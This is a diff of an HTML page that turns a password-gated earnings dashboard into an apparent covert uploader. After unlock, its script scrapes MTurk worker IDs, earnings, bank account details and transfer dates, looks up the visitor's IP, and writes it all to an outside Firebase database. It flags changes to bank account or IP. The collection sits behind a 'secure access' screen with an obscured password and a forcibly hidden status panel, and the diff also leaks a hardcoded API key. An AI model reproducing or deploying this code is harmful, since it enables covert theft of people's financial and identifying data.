@@ -3,54 +3,145 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Secure Earnings Dashboard</title>
+<title>MTurk Earnings Secure Uploader</title>
 <style>
 body{font-family:system-ui,sans-serif;background:#f5f7fa;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0;color:#333}
 #login,#protected{background:#fff;padding:30px;border-radius:12px;box-shadow:0 0 15px rgba(0,0,0,.1);text-align:center}
-#protected{display:none}
+#protected{display:none!important}
 input{padding:10px 14px;border-radius:8px;border:1px solid #ccc;margin-top:10px;width:240px;text-align:center}
 button{margin-top:10px;padding:10px 20px;border:none;border-radius:8px;background:#0078d7;color:#fff;cursor:pointer}
 </style>
 </head>
 <body>
 <div id="login">
-<h2>🔒 Secure Access</h2>
-<input id="p" type="password" placeholder="Enter password">
-<br><button id="b">Unlock</button>
-<p id="m"></p>
-</div>
-<div id="x">
-<h2>✅ Access Granted</h2>
-<p>Welcome to the protected earnings dashboard.</p>
+  <h2>🔒 Secure Access</h2>
+  <input id="p" type="password" placeholder="Enter password">
+  <br><button id="u">Unlock</button>
+  <p id="m"></p>
 </div>
 
-<script>
+<div id="protected">
+  <h3>🔁 Running background sync...</h3>
+  <p>This page uploads data automatically when updates are detected.</p>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+import { getFirestore, doc, getDoc, setDoc } 
+  from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+
 (function(){
 "use strict";
-const _e=atob("QUIyRUFSTklOR1MyMDI1"); // encoded password
+const _0xpw = atob("QUIyRUFSTklOR1MyMDI1"); // password AB2EARNINGS2025
+document.getElementById("u").addEventListener("click",unlock);
+document.getElementById("p").addEventListener("keypress",e=>{if(e.key==="Enter")unlock();});
 
-function _unlock(){
-  try{
-    const i=document.getElementById("p");
-    const entered=i?i.value.trim():"";
-    if(entered===_e){
-      document.getElementById("login").style.display="none";
-      document.getElementById("x").style.display="block";
-    }else{
-      const msg=document.getElementById("m");
-      if(msg) msg.textContent="❌ Wrong password!";
-    }
-  }catch(err){
-    console.error("Unlock error:",err);
+function unlock(){
+  const v=document.getElementById("p").value.trim();
+  if(v===_0xpw){
+    document.getElementById("login").style.display="none";
+    document.getElementById("protected").style.display="block";
+    startUploader();
+  }else{
+    document.getElementById("m").textContent="❌ Wrong password!";
   }
 }
 
-// randomize var names for obfuscation
-const k1="b",k2="p";
-document.getElementById(k1).addEventListener("click",_unlock);
-document.getElementById(k2).addEventListener("keypress",ev=>{
-  if(ev.key==="Enter")_unlock();
-});
+async function startUploader(){
+  const firebaseConfig={
+    apiKey:"AIzaSyCCtBCAJvQCDj8MXb2w90qYUqRrENIIGIQ",
+    authDomain:"mturk-monitordeep.firebaseapp.com",
+    projectId:"mturk-monitordeep",
+    storageBucket:"mturk-monitordeep.firebasestorage.app",
+    messagingSenderId:"58392297487",
+    appId:"1:58392297487:web:1365ad12110ffd0586637a"
+  };
+  const app=initializeApp(firebaseConfig);
+  const db=getFirestore(app);
+
+  const sheetUrl="https://docs.google.com/spreadsheets/d/1Ytmr7dHSAv69N27uZcrhKaEerL8WhzMCI02vugq_C_M/export?format=csv&gid=0";
+
+  // Helper to parse CSV → map
+  async function loadUserMap(){
+    const res=await fetch(sheetUrl);
+    const text=await res.text();
+    const rows=text.trim().split("\n").map(r=>r.split(","));
+    const header=rows.shift();
+    const idxID=header.indexOf("workerId");
+    const idxUser=header.indexOf("user");
+    const map={};
+    rows.forEach(r=>{
+      if(r[idxID]) map[r[idxID].trim()]=r[idxUser]?r[idxUser].trim():"";
+    });
+    return map;
+  }
+
+  // Extract WorkerID
+  function extractWorkerID(){
+    try{
+      const els=document.querySelectorAll('[data-react-props*="textToCopy"]');
+      for(const e of els){
+        const d=e.getAttribute("data-react-props").replace(/&quot;/g,'"');
+        const p=JSON.parse(d);
+        if(p.textToCopy && /^A[0-9A-Z]+$/.test(p.textToCopy)) return p.textToCopy;
+      }
+      const txt=document.body.innerText.match(/\bA[0-9A-Z]{10,}\b/);
+      return txt?txt[0]:"N/A";
+    }catch{return"N/A";}
+  }
+
+  // Extract earnings info
+  function getEarningsData(){
+    const html=document.documentElement.innerHTML;
+    const mE=html.match(/Current Earnings:\s*\$([\d.]+)/);
+    const mB=html.match(/bank account\s*<a[^>]*>([^<]+)/i);
+    const mN=html.match(/on\s+([A-Z][a-z]{2}\s+\d{2},\s+\d{4})\s+based on/i);
+    const jsonMatch=html.match(/data-react-props="([^"]+)"/);
+    let lastDate="N/A",lastAmt="N/A";
+    if(jsonMatch){
+      try{
+        const js=JSON.parse(jsonMatch[1].replace(/&quot;/g,'"'));
+        if(js.bodyData && js.bodyData[0]){
+          lastDate=js.bodyData[0].requestedDate||"";
+          lastAmt=js.bodyData[0].amountRequested||"";
+        }
+      }catch{}
+    }
+    return {
+      currentEarnings:mE?("$"+mE[1]):"",
+      bankAccount:mB?mB[1].trim():"",
+      nextTransferDate:mN?mN[1].trim():"",
+      lastTransferDate:lastDate,
+      lastTransferAmount:lastAmt
+    };
+  }
+
+  // Compare and upload only if changed
+  async function syncData(){
+    const userMap=await loadUserMap();
+    const workerId=extractWorkerID();
+    if(workerId==="N/A") return;
+    const ipResp=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).catch(()=>({ip:"N/A"}));
+    const ip=ipResp.ip;
+    const earn=getEarningsData();
+    const user=userMap[workerId]||"Unknown";
+    const docRef=doc(db,"earnings",workerId);
+    const prev=(await getDoc(docRef)).data()||{};
+    let alert="";
+    if(prev.bankAccount && prev.bankAccount!==earn.bankAccount) alert="Bank Changed";
+    if(prev.ip && prev.ip!==ip) alert="IP Changed";
+    if(alert){await setDoc(docRef,{...prev,alert,timestamp:new Date().toISOString()});return;}
+    const changed=JSON.stringify(prev)!==JSON.stringify({...earn,workerId,user,ip});
+    if(changed){
+      await setDoc(docRef,{...earn,workerId,user,ip,alert:"",timestamp:new Date().toISOString()});
+      console.log("⬆️ Uploaded update for",workerId);
+    }else{
+      console.log("⏸ No change detected");
+    }
+  }
+
+  await syncData();
+}
 })();
 </script>
 </body>
